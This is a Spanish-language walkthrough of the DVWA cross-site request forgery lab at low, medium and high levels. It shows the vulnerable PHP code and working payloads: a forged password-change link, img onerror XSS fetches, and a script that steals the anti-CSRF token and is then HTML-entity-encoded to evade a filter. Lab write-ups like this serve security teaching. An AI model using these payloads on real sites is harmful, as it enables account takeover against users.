# CSRF (Cross-Site Request Forgery)

CSRF (Cross-Site Request Forgery) es un tipo de ataque que engaña a un navegador para que realice acciones no autorizadas en un sitio web donde la persona usuaria está autenticada. Esto se consigue mediante:

1. **Solicitudes entre sitios:** El atacante crea solicitudes HTTP maliciosas que parecen legítimas para el servidor, aprovechando la autenticación de la persona usuaria sin su conocimiento.
2. **Formularios ocultos o enlaces maliciosos:** Pueden estar en sitios externos o enviarse a través de correos electrónicos. Cuando la persona usuaria hace clic o visita estos enlaces, se ejecutan acciones como cambios de contraseña o transferencias de dinero.
3. **Imágenes o iframes:** Incluir etiquetas `<img>` o `<iframe>` en sitios maliciosos o foros para forzar al navegador a realizar solicitudes no autorizadas mientras la persona usuaria está autenticada en otro sitio.
4. **Scripts de sitios cruzados:** Utilizar XSS en combinación con CSRF puede amplificar la capacidad de ejecutar acciones no deseadas al cargar scripts maliciosos que realizan peticiones automáticas.

La protección contra CSRF generalmente implica:

- **Tokens CSRF:** El servidor envía un token único en cada formulario o solicitud que el navegador debe devolver, verificando así la legitimidad de la solicitud.
- **Verificación de Referer y Origen:** Los servidores pueden comprobar de dónde proviene la solicitud para asegurarse de que no es un sitio externo.
- **Encabezados de Seguridad:** Utilizar encabezados HTTP como `SameSite` en cookies para limitar el envío de estas en solicitudes entre sitios.

Este método de ataque explota la confianza que un sitio tiene en el navegador de la persona usuaria. La implementación de medidas de seguridad adecuadas es fundamental para proteger la integridad de las interacciones con la aplicación web.

## Bajo

En el primer nivel, se presenta un campo de entrada que permite cambiar la contraseña.

<div style={{textAlign: 'center'}}>
    ![login](/img/attacks/CSRF/login.png)
</div>

:::note

Los navegadores están comenzando a configurar de forma predeterminada el indicador de cookies SameSite en Lax, lo que elimina algunos tipos de ataques CSRF. Cuando esta configuración esté completamente implementada, este laboratorio puede no funcionar como se esperaba originalmente.

Anuncios:

- Chromium
- Edge
- Firefox

Como alternativa al ataque tradicional de alojar URL o códigos maliciosos en un host separado, se puede intentar utilizar otras vulnerabilidades en la aplicación para almacenarlos; el laboratorio Stored XSS sería un buen lugar para comenzar.

:::

Por lo tanto, se recomienda realizar los ataques aprovechando los XSS, como se indica.

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];
    $pass_conf = $_GET[ 'password_conf' ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass_new = md5( $pass_new );

        // Update the database
        $current_user = dvwaCurrentUser();
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

Como se puede observar, el código no tiene ninguna verificación contra CSRF, por lo que si se aprovecha un ataque XSS (reflejado o almacenado), es posible explotar esta vulnerabilidad.

Antes de realizar el ataque, se puede comprobar cómo funciona la petición de cambio de contraseña, observando que se realiza mediante un GET con los parámetros en la URL.

<div style={{textAlign: 'center'}}>
    ![cambios password básico CSRF](/img/attacks/CSRF/attack-basic-url.png)
</div>

Al no tener ninguna protección contra ataques CSRF, bastaría con crear una web donde la persona usuaria haga clic en un enlace para cambiar la contraseña.

```html
<a href="http://localhost/vulnerabilities/csrf/?password_new=p&password_conf=p&Change=Change#">
```

En este caso, la efectividad del ataque depende más de la capacidad de engaño de la persona atacante que de la vulnerabilidad en sí.

## Medio

En el nivel medio, si se intenta el ataque desde un fichero externo al dominio, no funcionará, como se puede ver en el código fuente. Esto se debe a que se comprueba el origen de la petición y, si no proviene del mismo servidor, no se ejecuta.

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );

            // Update the database
            $current_user = dvwaCurrentUser();
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    }
    else {
        // Didn't come from a trusted source
        echo "<pre>That request didn't look correct.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

Por ello, se puede inyectar el siguiente código XSS para que, cada vez que se cargue la web, se ejecute un código JavaScript que realice una petición fetch y cambie la contraseña.

```html
<img src=x onerror='fetch("http://localhost/vulnerabilities/csrf/?password_new=p&password_conf=p&Change=Change")'>
```

Para cambiar la contraseña de una persona usuaria, solo es necesario compartir la siguiente URL:

```bash
http://localhost/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3D%27fetch%28%22http%3A%2F%2Flocalhost%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dp%26password_conf%3Dp%26Change%3DChange%22%29%27%3E#
```

Si la aplicación tiene algún XSS almacenado, bastaría con guardar el código en el sistema para que el cambio de contraseña se realice cada vez que una persona usuaria visite la página.

## Alto

En el nivel alto, el código añade un token CSRF para evitar el ataque, pero aprovechando otra vulnerabilidad es posible realizar un bypass.

```php
<?php

$change = false;
$request_type = "html";
$return_message = "Request Failed";

if ($_SERVER['REQUEST_METHOD'] == "POST" && array_key_exists ("CONTENT_TYPE", $_SERVER) && $_SERVER['CONTENT_TYPE'] == "application/json") {
    $data = json_decode(file_get_contents('php://input'), true);
    $request_type = "json";
    if (array_key_exists("HTTP_USER_TOKEN", $_SERVER) &&
        array_key_exists("password_new", $data) &&
        array_key_exists("password_conf", $data) &&
        array_key_exists("Change", $data)) {
        $token = $_SERVER['HTTP_USER_TOKEN'];
        $pass_new = $data["password_new"];
        $pass_conf = $data["password_conf"];
        $change = true;
    }
} else {
    if (array_key_exists("user_token", $_REQUEST) &&
        array_key_exists("password_new", $_REQUEST) &&
        array_key_exists("password_conf", $_REQUEST) &&
        array_key_exists("Change", $_REQUEST)) {
        $token = $_REQUEST["user_token"];
        $pass_new = $_REQUEST["password_new"];
        $pass_conf = $_REQUEST["password_conf"];
        $change = true;
    }
}

if ($change) {
    // Check Anti-CSRF token
    checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' );

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = mysqli_real_escape_string ($GLOBALS["___mysqli_ston"], $pass_new);
        $pass_new = md5( $pass_new );

        // Update the database
        $current_user = dvwaCurrentUser();
        $insert = "UPDATE `users` SET password = '" . $pass_new . "' WHERE user = '" . $current_user . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert );

        // Feedback for the user
        $return_message = "Password Changed.";
    }
    else {
        // Issue with passwords matching
        $return_message = "Passwords did not match.";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);

    if ($request_type == "json") {
        generateSessionToken();
        header ("Content-Type: application/json");
        print json_encode (array("Message" =>$return_message));
        exit;
    } else {
        echo "<pre>" . $return_message . "</pre>";
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

Lo primero es identificar el campo de entrada donde se almacena el token, en este caso `user_token`. Para recuperar un token válido, primero se realiza una petición a la web original donde se encuentra el cambio de contraseña. Se obtiene la página web como texto y se convierte en un DOM virtual, desde el cual se recupera el token y se utiliza para cambiar la contraseña.

```js
fetch("http://localhost/vulnerabilities/csrf/index.php").then(function (response) {
    return response.text();
}).then(async function (html) {
    let parser = new DOMParser();
    let doc = parser.parseFromString(html, 'text/html');
    let token = doc.getElementsByName('user_token')[0].value
    fetch("http://localhost/vulnerabilities/csrf/?password_new=g&password_conf=g&Change=Change&user_token=" + token + "#")
});
```

Para facilitar el ataque, se puede [minimizar](https://minify-js.com/) el JavaScript.

```js
fetch("http://localhost/vulnerabilities/csrf/index.php").then((function(e){return e.text()})).then((async function(e){let t=(new DOMParser).parseFromString(e,"text/html").getElementsByName("user_token")[0].value;fetch("http://localhost/vulnerabilities/csrf/?password_new=g&password_conf=g&Change=Change&user_token="+t+"#")}));
```

A continuación, se aprovecha la vulnerabilidad XSS reflejada mediante el ataque XSS de imagen.

```html
<img src=x onerror='fetch("http://localhost/vulnerabilities/csrf/index.php").then((function(e){return e.text()})).then((async function(e){let t=(new DOMParser).parseFromString(e,"text/html").getElementsByName("user_token")[0].value;fetch("http://localhost/vulnerabilities/csrf/?password_new=g&password_conf=g&Change=Change&user_token="+t+"#")}));'>
```

Sin embargo, el ataque no es funcional.

<div style={{textAlign: 'center'}}>
    ![Ataque fallido](/img/attacks/CSRF/attack-high-fail.png)
</div>

Esto se debe a que la expresión regular que evita el XSS elimina parte del ataque.

<div style={{textAlign: 'center'}}>
    ![filter xss](/img/attacks/CSRF/regex-xss.png)
</div>

Para solucionar esto, se puede convertir el JavaScript a entidades HTML para evitar el filtro. Para ello, se puede utilizar la siguiente [herramienta online](https://www.browserling.com/tools/text-to-html-entities).

<div style={{textAlign: 'center'}}>
    ![convert to html entities from ascii](/img/attacks/CSRF/convert-to-html-entities-ascii.png)
</div>

<div style={{textAlign: 'center'}}>
    ![html entities conversion](/img/attacks/CSRF/html-entities-conversion.png)
</div>

```html
<img src=/ onerror="&#x66;&#x65;&#x74;&#x63;&#x68;&#x28;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x6c;&#x6f;&#x63;&#x61;&#x6c;&#x68;&#x6f;&#x73;&#x74;&#x2f;&#x76;&#x75;&#x6c;&#x6e;&#x65;&#x72;&#x61;&#x62;&#x69;&#x6c;&#x69;&#x74;&#x69;&#x65;&#x73;&#x2f;&#x63;&#x73;&#x72;&#x66;&#x2f;&#x69;&#x6e;&#x64;&#x65;&#x78;&#x2e;&#x70;&#x68;&#x70;&#x22;&#x29;&#x2e;&#x74;&#x68;&#x65;&#x6e;&#x28;&#x28;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x28;&#x65;&#x29;&#x7b;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x20;&#x65;&#x2e;&#x74;&#x65;&#x78;&#x74;&#x28;&#x29;&#x7d;&#x29;&#x29;&#x2e;&#x74;&#x68;&#x65;&#x6e;&#x28;&#x28;&#x61;&#x73;&#x79;&#x6e;&#x63;&#x20;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x28;&#x65;&#x29;&#x7b;&#x6c;&#x65;&#x74;&#x20;&#x74;&#x3d;&#x28;&#x6e;&#x65;&#x77;&#x20;&#x44;&#x4f;&#x4d;&#x50;&#x61;&#x72;&#x73;&#x65;&#x72;&#x29;&#x2e;&#x70;&#x61;&#x72;&#x73;&#x65;&#x46;&#x72;&#x6f;&#x6d;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x65;&#x2c;&#x22;&#x74;&#x65;&#x78;&#x74;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x22;&#x29;&#x2e;&#x67;&#x65;&#x74;&#x45;&#x6c;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x73;&#x42;&#x79;&#x4e;&#x61;&#x6d;&#x65;&#x28;&#x22;&#x75;&#x73;&#x65;&#x72;&#x5f;&#x74;&#x6f;&#x6b;&#x65;&#x6e;&#x22;&#x29;&#x5b;&#x30;&#x5d;&#x2e;&#x76;&#x61;&#x6c;&#x75;&#x65;&#x3b;&#x66;&#x65;&#x74;&#x63;&#x68;&#x28;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x6c;&#x6f;&#x63;&#x61;&#x6c;&#x68;&#x6f;&#x73;&#x74;&#x2f;&#x76;&#x75;&#x6c;&#x6e;&#x65;&#x72;&#x61;&#x62;&#x69;&#x6c;&#x69;&#x74;&#x69;&#x65;&#x73;&#x2f;&#x63;&#x73;&#x72;&#x66;&#x2f;&#x3f;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x5f;&#x6e;&#x65;&#x77;&#x3d;&#x67;&#x26;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x5f;&#x63;&#x6f;&#x6e;&#x66&#x3d;&#x67;&#x26;&#x43;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x3d;&#x43;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x26;&#x75;&#x73;&#x65;&#x72;&#x5f;&#x74;&#x6f;&#x6b;&#x65;&#x6e;&#x3d;&#x22;&#x2b;&#x74;&#x2b;&#x22;&#x23;&#x22;&#x29;&#x7d;&#x29;&#x29;&#x3b;">
```

Como se observa, el filtro ya no detiene el ataque y se consigue el cambio de contraseña.

<div style={{textAlign: 'center'}}>
    ![xss bypass](/img/attacks/CSRF/xss-attack-high.png)
</div>

<div style={{textAlign: 'center'}}>
    ![test password](/img/attacks/CSRF/check-high-password-change.png)
</div>
